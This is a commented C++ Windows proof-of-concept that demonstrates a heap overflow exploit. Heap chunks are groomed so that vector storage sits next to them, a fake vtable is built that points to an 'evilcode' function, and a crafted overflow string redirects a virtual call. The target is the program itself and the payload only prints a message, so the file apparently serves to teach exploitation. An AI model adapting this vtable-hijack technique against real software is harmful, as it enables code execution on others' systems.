#include <Windows.h>
#include <stdio.h>
#include <vector>
using namespace std;

#define CHUNK_SIZE 0x190
#define ALLOC_COUNT 10

// Object with Virtual Function 
// Used to create entry we overflow in exploit
class SomeObject {
public:
    void function1() {
    };
    virtual void virtualFunction() {
        printf("test\n");
    };
};

// Evil Code that is never explicitly called
void evilcode(void) {
    printf("Hi~ I'm Evil! * o *\n");
}

// Structure to hold values (Adjacent in memory)
// To emulate a entry in the VFTable
struct vfHierarchy {
    int veax;
    int vedx;
    int vecx;
};

int main(int args, char** argv) {

    // Initial size of Vector (40 elements)
    int vectorSize = 40;
    // Heap Handle
    HANDLE hChunk;
    // Array of non LFH Allocations
    void* allocations[ALLOC_COUNT];
    // Objects to allocate (Make pointers to them)
    SomeObject* objects[5];
    // Allocate Object
    SomeObject* obj = new SomeObject();
    // Print address of Object
    printf("SomeObject address : 0x%08x\n", obj);

    // Get the handle for the default HEAP of the process.
    HANDLE defaultHeap = GetProcessHeap();

    // Allocate 10 objections (Do not invoke LFH)
    for (int i = 0; i < ALLOC_COUNT; i++) {
        hChunk = HeapAlloc(defaultHeap, 0, CHUNK_SIZE);
        memset(hChunk, 'A', CHUNK_SIZE);
        allocations[i] = hChunk;
        printf("[%d] Heap chunk in backend : 0x%08x\n", i, hChunk);
    }

    // Free Chunk 6
    HeapFree(defaultHeap, HEAP_NO_SERIALIZE, allocations[6]);
    // Allocate a number of Vectors who's elements are stored 
    // on the heap, hope one is allocated in the hole we 
    // created
    vector<SomeObject*> v1(vectorSize, obj);
    vector<SomeObject*> v2(vectorSize, obj);
    vector<SomeObject*> v3(vectorSize, obj);
    vector<SomeObject*> v4(vectorSize, obj);
    vector<SomeObject*> v5(vectorSize, obj);
    vector<SomeObject*> v6(vectorSize, obj);
    vector<SomeObject*> v7(vectorSize, obj);
    vector<SomeObject*> v8(vectorSize, obj);
    vector<SomeObject*> v9(vectorSize, obj);
    vector<SomeObject*> v10(vectorSize, obj);

    // Debug Info
    printf("vector : 0x%08x\n", v1);
    printf("vector : 0x%08x\n", v2);
    printf("vector : 0x%08x\n", v3);
    printf("vector : 0x%08x\n", v4);
    printf("vector : 0x%08x\n", v5);
    printf("vector : 0x%08x\n", v6);
    printf("vector : 0x%08x\n", v7);
    printf("vector : 0x%08x\n", v8);
    printf("vector : 0x%08x\n", v9);
    printf("vector : 0x%08x\n", v10);

    /*--- Attack Code ---*/
    // A struct for saving   pointers which mimics the access of virtual function (object -> vtable -> vf code)
    vfHierarchy v = { (int)evilcode };     // veax = pointer to SHELL/Code to Execute 
    v.vedx = (int)&v;                   // vedx = pointer to veax 
    v.vecx = (int)&v + 4;               // vecx = pointer to vedx 
    
    printf("Shellcode address : 0x%08x and is stored as 0x%08x in the VTable Emulated Object\n", (int)evilcode, v.veax);
    //printf("Function address : 0x%08x\n", v.veax);
    printf("Vtable address : 0x%08x\n", v.vedx);
    printf("Object address : 0x%08x\n", v.vecx);

    char evilString[445];
    sprintf(evilString, "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCDDDD%c%c%c%cefghijklmnopqrstuvwxyzABCD", (char)v.vecx, (char)((int)v.vecx >> 8), (char)((int)v.vecx >> 16), (char)((int)v.vecx >> 24));
    printf("The Evil String is: %s",evilString);
    //memset(allocations[5], 'B', CHUNK_SIZE + 8 + 32);
    // Attack is performed
    memcpy(allocations[5], evilString, sizeof(evilString));
	system("PAUSE");
    printf("====================================\n");
    printf("After heap overflow, call v1[0]\n");
    printf("====================================\n");
    v1.at(0)->virtualFunction();
    system("PAUSE");
    return 0;
}